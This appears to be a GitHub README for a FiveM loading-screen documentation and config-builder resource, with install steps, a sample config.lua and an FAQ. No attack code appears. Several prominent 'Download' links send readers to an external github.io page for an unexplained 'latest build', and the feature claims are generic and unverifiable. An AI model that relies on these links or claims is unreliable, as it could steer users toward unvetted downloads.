# FiveM Loading Screen Docs v1.1.0 – Game Server Resource 2026

A complete documentation and configuration toolkit for creating custom loading screens on FiveM servers. Supports ESX, QBCore, QBX, and RedM frameworks, and includes an AI-powered build assistant plus a live preview system.

[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/davisvictor20/fivem-loading-screen-v110?style=flat-square)](https://github.com/davisvictor20/fivem-loading-screen-v110)

---

<p align="center">
  <a href="https://davisvictor20.github.io/fivem-loading-screen-v110/">
    <img src="https://img.shields.io/badge/Download-FiveM%20Loading%20Screen%20Docs%20Latest-brightgreen?style=for-the-badge" alt="Download FiveM Loading Screen Docs">
  </a>
</p>

> **[Direct Download – FiveM Loading Screen Docs v1.1.0](https://davisvictor20.github.io/fivem-loading-screen-v110/)**

---

[Download Latest Build](https://davisvictor20.github.io/fivem-loading-screen-v110/)

---

## Overview

This resource gives server admins and developers a turnkey solution for building and deploying professional loading screens on FiveM. Whether your server runs ESX, QBCore, QBX, or RedM, the included documentation and tools let you craft visually rich NUI-based loading experiences without deep front-end knowledge.

The project bundles a config builder, an AI build assistant, and a live preview to simplify the entire development pipeline. Community contributions and shared knowledge help tailor loading screens to any server theme—from hardcore roleplay on GTA5 to western settings on RedM. The docs cover everything from basic HTML structure to advanced customization with OX framework integration.

## Capabilities

- **Config Builder** – An interactive tool that generates loading screen configurations without manual code editing.
- **AI Build Assistant** – Provides intelligent suggestions and auto-generates code for custom loading screen components.
- **Live Preview** – See changes in real time before pushing them to your server.
- **Multi-Framework Support** – Works with ESX, QBCore, QBX, and RedM ecosystems.
- **NUI Integration** – Full support for FiveM’s NUI system for smooth client-side rendering.
- **Comprehensive Documentation** – Step-by-step guides for installation, customization, and troubleshooting.
- **Community Templates** – Shared designs and configs contributed by the user community.
- **Cross-Platform Ready** – Compatible with both GTA5 and RedM FiveM implementations.

## Installation

Clone the repository to your local machine or directly into your FiveM server’s resources directory:

```bash
git clone https://github.com/davisvictor20/fivem-loading-screen-v110.git fivem-loading-screen-docs
```

For first-time setup, navigate into the project folder and launch the documentation interface:

```bash
cd fivem-loading-screen-docs
# Open index.html in your browser or serve via a local HTTP server
```

Add the resource to your server.cfg:

```
ensure fivem-loading-screen-docs
```

## Usage

Once installed, access the documentation and config builder through your browser at the local server address. The typical workflow is:

1. Open the config builder interface and choose your framework (ESX, QBCore, QBX, or RedM).
2. Customize loading screen elements using the visual editor or the AI assistant.
3. Preview changes in real time before exporting the final configuration.
4. Copy the generated code into your server’s loading screen resource.

For advanced users, directly edit the HTML, CSS, and JavaScript files in the `nui` folder to create fully bespoke loading screen experiences.

## Configuration

Loading screen settings are stored in `config.lua` inside the resource folder. Key options include:

```lua
Config = {
    Framework = 'qbcore',  -- Options: 'esx', 'qbcore', 'qbx', 'redm'
    Theme = 'default',
    BackgroundType = 'image',  -- 'image', 'video', 'color'
    ShowServerInfo = true,
    LoadingBarStyle = 'progress',
    MusicEnabled = false
}
```

For framework-specific settings, refer to the documentation files in the `docs` directory corresponding to your chosen framework.

## Requirements

- FiveM server (GTA5 or RedM)
- Supported framework: ESX, QBCore, QBX, or RedM
- A modern web browser to access the documentation and config builder
- Basic familiarity with FiveM resource structure
- NUI support enabled on your server

## FAQ

**How do I update to the latest version?**  
Pull the latest changes from the repository with `git pull`, or download the newest release from the link above. Always back up your custom configurations before updating.

**Can I use this with custom frameworks?**  
The docs primarily cover ESX, QBCore, QBX, and RedM, but the underlying NUI system works with any FiveM framework. You may need to adapt configuration files for unsupported frameworks.

**Where can I find community templates?**  
Visit the community section inside the documentation interface, or check the `templates` folder in the repository for shared loading screen designs.

**My loading screen isn’t displaying correctly.**  
Verify your server.cfg includes the resource, check the browser console for JavaScript errors, and ensure your framework configuration matches your server setup. Refer to the troubleshooting guide in the documentation.

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
